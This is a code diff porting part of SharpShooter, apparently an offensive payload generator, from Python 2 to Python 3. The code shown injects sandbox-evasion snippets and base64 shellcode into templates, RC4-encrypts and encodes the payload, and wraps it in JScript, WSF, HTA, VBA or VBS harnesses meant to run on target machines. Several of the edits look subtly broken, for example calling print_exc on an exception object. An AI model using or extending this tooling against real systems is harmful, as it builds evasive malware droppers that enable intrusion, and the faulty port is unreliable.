@@ -162,12 +162,12 @@ class SharpShooter:
         return args
 
     def read_file(self, f):
-        with open(f, 'r') as fs:
+        with open(f, 'rb') as fs:
             content = fs.read()
         return content
 
     def rand_key(self, n):
-        return ''.join([random.choice(string.lowercase) for i in xrange(n)])
+        return ''.join([random.choice(string.ascii_lowercase) for i in range(n)])
 
     def gzip_str(self, string_):
         fgz = BytesIO()
@@ -182,7 +182,7 @@ class SharpShooter:
         return fgz
 
     def rc4(self, key, data):
-        S = range(256)
+        S = list(range(256))
         j = 0
         out = []
 
@@ -323,6 +323,7 @@ End Sub"""
             elif(payload_type == 9):
                 file_type = "slk"
         except Exception as e:
+
             print("\n\033[1;31m[!]\033[0;0m Incorrect choice")
 
         sandbox_techniques=""
@@ -399,10 +400,12 @@ End Sub"""
                     break
 
             except Exception as e:
+            
                 print("\n\033[1;31m[!]\033[0;0m Incorrect choice")
 
-        template_code = template_body.replace("%SANDBOX_ESCAPES%", sandbox_techniques)
-
+        test = template_body.decode(encoding='utf-8')
+        
+        template_code = test.replace("%SANDBOX_ESCAPES%", sandbox_techniques)
         delivery_method = "1"
         encoded_sc = ""
         while True:
@@ -444,7 +447,8 @@ End Sub"""
                     #    sc_split = [encoded_sc[i:i+100] for i in range(0, len(encoded_sc), 100)]
                     #    for i in sc_split:
                     #else:
-                    template_code = template_code.replace("%SHELLCODE64%", encoded_sc)
+                    test= encoded_sc.decode(encoding='utf-8')
+                    template_code = template_code.replace("%SHELLCODE64%", test)
 
                 else:
                     refs = args.refs
@@ -492,7 +496,8 @@ End Sub"""
 
                 break
             except Exception as e:
-                print(e)
+                print(e.print_exc())
+                traceback.print_exc()
                 print("\n\033[1;31m[!]\033[0;0m Incorrect choice")
                 sys.exit(-1)
 
@@ -516,36 +521,36 @@ End Sub"""
 
         key = self.rand_key(10)
         payload_encrypted = self.rc4(key, template_code)
-        payload_encoded = base64.b64encode(payload_encrypted)
+        payload_encoded = base64.b64encode(payload_encrypted.encode(encoding='utf-8'))
 
         awl_payload_simple = ""
 
         if("js" in file_type or args.comtechnique):
-            harness = self.read_file("templates/harness.js")
-            payload = harness.replace("%B64PAYLOAD%", payload_encoded)
+            harness = self.read_file("templates/harness.js").decode(encoding='UTF-8')
+            payload = harness.replace("%B64PAYLOAD%", payload_encoded.decode(encoding='UTF-8'))
             payload = payload.replace("%KEY%", "'%s'" % (key))
             payload_minified = jsmin(payload)
             awl_payload_simple = template_code
         elif("wsf" in file_type):
             harness = self.read_file("templates/harness.wsf")
-            payload = harness.replace("%B64PAYLOAD%", payload_encoded)
+            payload = harness.replace("%B64PAYLOAD%", payload_encoded.decode(encoding='utf-8'))
             payload = payload.replace("%KEY%", "'%s'" % (key))
             payload_minified = jsmin(payload)
         elif("hta" in file_type):
             harness = self.read_file("templates/harness.hta")
-            payload = harness.replace("%B64PAYLOAD%", payload_encoded)
+            payload = harness.replace("%B64PAYLOAD%", payload_encoded.decode(encoding='utf-8'))
             payload = payload.replace("%KEY%", "'%s'" % (key))
             payload_minified = jsmin(payload)
         elif("vba" in file_type):
             harness = self.read_file("templates/harness.vba")
-            payload = harness.replace("%B64PAYLOAD%", payload_encoded)
+            payload = harness.replace("%B64PAYLOAD%", payload_encoded.decode(encoding='utf-8'))
             payload = payload.replace("%KEY%", "\"%s\"" % (key))
             payload_minified = jsmin(payload)
         elif("slk" in file_type):
             pass
         else:
             harness = self.read_file("templates/harness.vbs")
-            payload = harness.replace("%B64PAYLOAD%", payload_encoded)
+            payload = harness.replace("%B64PAYLOAD%", payload_encoded.decode(encoding='utf-8'))
             payload = payload.replace("%KEY%", "\"%s\"" % (key))
 
         if (payload_type == 3):
